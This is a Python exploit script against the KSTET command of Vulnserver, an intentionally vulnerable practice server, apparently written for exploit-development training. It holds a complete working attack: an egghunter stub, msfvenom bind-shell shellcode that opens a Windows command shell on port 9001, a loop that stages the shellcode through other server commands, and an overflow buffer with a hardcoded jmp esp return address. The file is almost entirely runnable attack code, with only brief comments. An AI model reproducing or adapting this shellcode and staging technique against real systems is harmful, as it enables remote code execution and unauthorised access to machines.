# Exploit for Vulnserver KSTET - Egghunter
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xdb\xca\xd9\x74\x24\xf4\xbd\x24\x9a\x61"
shellcode_bind += b"\x92\x58\x29\xc9\xb1\x53\x31\x68\x17\x03"
shellcode_bind += b"\x68\x17\x83\xe4\x9e\x83\x67\x18\x76\xc1"
shellcode_bind += b"\x88\xe0\x87\xa6\x01\x05\xb6\xe6\x76\x4e"
shellcode_bind += b"\xe9\xd6\xfd\x02\x06\x9c\x50\xb6\x9d\xd0"
shellcode_bind += b"\x7c\xb9\x16\x5e\x5b\xf4\xa7\xf3\x9f\x97"
shellcode_bind += b"\x2b\x0e\xcc\x77\x15\xc1\x01\x76\x52\x3c"
shellcode_bind += b"\xeb\x2a\x0b\x4a\x5e\xda\x38\x06\x63\x51"
shellcode_bind += b"\x72\x86\xe3\x86\xc3\xa9\xc2\x19\x5f\xf0"
shellcode_bind += b"\xc4\x98\x8c\x88\x4c\x82\xd1\xb5\x07\x39"
shellcode_bind += b"\x21\x41\x96\xeb\x7b\xaa\x35\xd2\xb3\x59"
shellcode_bind += b"\x47\x13\x73\x82\x32\x6d\x87\x3f\x45\xaa"
shellcode_bind += b"\xf5\x9b\xc0\x28\x5d\x6f\x72\x94\x5f\xbc"
shellcode_bind += b"\xe5\x5f\x53\x09\x61\x07\x70\x8c\xa6\x3c"
shellcode_bind += b"\x8c\x05\x49\x92\x04\x5d\x6e\x36\x4c\x05"
shellcode_bind += b"\x0f\x6f\x28\xe8\x30\x6f\x93\x55\x95\xe4"
shellcode_bind += b"\x3e\x81\xa4\xa7\x56\x66\x85\x57\xa7\xe0"
shellcode_bind += b"\x9e\x24\x95\xaf\x34\xa2\x95\x38\x93\x35"
shellcode_bind += b"\xd9\x12\x63\xa9\x24\x9d\x94\xe0\xe2\xc9"
shellcode_bind += b"\xc4\x9a\xc3\x71\x8f\x5a\xeb\xa7\x3a\x52"
shellcode_bind += b"\x4a\x18\x59\x9f\x2c\xc8\xdd\x0f\xc5\x02"
shellcode_bind += b"\xd2\x70\xf5\x2c\x38\x19\x9e\xd0\xc3\x06"
shellcode_bind += b"\x76\x5c\x25\x22\x98\x08\xfd\xda\x5a\x6f"
shellcode_bind += b"\x36\x7d\xa4\x45\x6e\xe9\xed\x8f\xa9\x16"
shellcode_bind += b"\xee\x85\x9d\x80\x65\xca\x19\xb1\x79\xc7"
shellcode_bind += b"\x09\xa6\xee\x9d\xdb\x85\x8f\xa2\xf1\x7d"
shellcode_bind += b"\x33\x30\x9e\x7d\x3a\x29\x09\x2a\x6b\x9f"
shellcode_bind += b"\x40\xbe\x81\x86\xfa\xdc\x5b\x5e\xc4\x64"
shellcode_bind += b"\x80\xa3\xcb\x65\x45\x9f\xef\x75\x93\x20"
shellcode_bind += b"\xb4\x21\x4b\x77\x62\x9f\x2d\x21\xc4\x49"
shellcode_bind += b"\xe4\x9e\x8e\x1d\x71\xed\x10\x5b\x7e\x38"
shellcode_bind += b"\xe7\x83\xcf\x95\xbe\xbc\xe0\x71\x37\xc5"
shellcode_bind += b"\x1c\xe2\xb8\x1c\xa5\x02\x5b\xb4\xd0\xaa"
shellcode_bind += b"\xc2\x5d\x59\xb7\xf4\x88\x9e\xce\x76\x38"
shellcode_bind += b"\x5f\x35\x66\x49\x5a\x71\x20\xa2\x16\xea"
shellcode_bind += b"\xc5\xc4\x85\x0b\xcc"

cmd    = "KSTET /.:/"
junk   = "A" * (60-len(egghunter))
eip    = "\xaf\x11\x50\x62"   # jmp esp in vulnserver.exe = 0x625011AF
jmp    = "\xeb\xb8"           # short jmp -46h
junk2  = "C" * (5000-66-4-2)

buffer = cmd + egghunter + junk + eip + jmp + junk2

# For loop to send the 2nd stage shellcode using the available commands

for command in ["STATS ", "RTIME ", "LTIME ", "SRUN ", "TRUN ", "GMON ", "GDOG ", "HTER ", "LTER ", "KSTAN "]:
    print "[*]Attempting to store shellcode in " + (command) + " command."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.136.129", 9999))
    print s.recv(1024)

    shell = command + "W00TW00T" + shellcode_bind
    s.send(shell)
    print s.recv(1024)
    s.close()

# Sending the 1st stage shellcode (egghunter)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
print "[*] Sending exploit..."

s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
